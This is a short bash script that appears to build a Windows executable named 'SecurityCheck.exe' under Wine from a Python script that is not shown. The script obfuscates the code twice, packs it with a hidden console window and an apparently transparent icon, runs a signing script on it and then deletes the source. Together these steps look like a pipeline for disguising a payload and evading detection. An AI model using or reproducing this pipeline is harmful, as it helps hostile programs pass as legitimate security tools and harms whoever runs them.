#!/bin/bash

# CONFIG
PYTHON_INSTALLER="python-3.10.0-amd64.exe"
PYTHON_URL="https://www.python.org/ftp/python/3.10.0/$PYTHON_INSTALLER"
SCRIPT_NAME="SecurityCheck.py"

sudo apt update
sudo apt install -y wine64 winetricks wget unzip
wget -nc "$PYTHON_URL"
wine "$PYTHON_INSTALLER" /quiet InstallAllUsers=1 PrependPath=1 Include_test=0
wine cmd /c "python.exe -m ensurepip"
wine cmd /c "python.exe -m pip install --upgrade pip"
wine cmd /c "python.exe -m pip install pyinstaller"
wine cmd /c "python.exe -m pip install pyarmor"
wine cmd /c "python.exe -m pip install requests"
wine cmd /c "python -m pip install --upgrade pywin32"
wine cmd /c "pyarmor gen scripts/${SCRIPT_NAME}"
python3 scripts/obfuscator.py dist/$SCRIPT_NAME
wine cmd /c "pyinstaller --onefile --noconsole --hidden-import=requests -i scripts/transparente.ico dist/${SCRIPT_NAME}"
mv dist/SecurityCheck.exe .
bash scripts/cert.sh SecurityCheck.exe
rm -rf build/ dist SecurityCheck.spec $PYTHON_INSTALLER scripts/SecurityCheck.py
